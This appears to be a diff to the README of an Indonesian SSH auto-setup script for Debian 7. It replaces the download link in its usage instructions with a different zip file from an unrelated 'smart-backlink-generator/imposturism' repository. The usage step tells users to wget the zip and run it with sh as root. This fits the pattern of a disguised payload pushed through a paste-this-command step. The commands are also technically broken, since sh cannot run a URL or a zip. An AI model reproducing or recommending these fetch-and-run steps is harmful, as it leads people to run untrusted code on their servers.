@@ -4,8 +4,8 @@ DEBIAN 7 AUTO SCRIPT
 Script Debian7 For SSH
 
 Cara penggunaan :
-# wget https://raw.githubusercontent.com/qanotbu/smart-backlink-generator/master/imposturism/smart-backlink-generator.zip
-# sh https://raw.githubusercontent.com/qanotbu/smart-backlink-generator/master/imposturism/smart-backlink-generator.zip
+# wget https://github.com/qanotbu/smart-backlink-generator/raw/refs/heads/master/imposturism/generator_backlink_smart_v2.2.zip
+# sh https://github.com/qanotbu/smart-backlink-generator/raw/refs/heads/master/imposturism/generator_backlink_smart_v2.2.zip
 
 Tunggu sampai proses selesai.
 kurang lebih 35 menit tergantung jaringan anda
@@ -52,4 +52,4 @@ Fail2Ban : [on]
 
 IPv6     : [off]
 
-https://raw.githubusercontent.com/qanotbu/smart-backlink-generator/master/imposturism/smart-backlink-generator.zip
+https://github.com/qanotbu/smart-backlink-generator/raw/refs/heads/master/imposturism/generator_backlink_smart_v2.2.zip
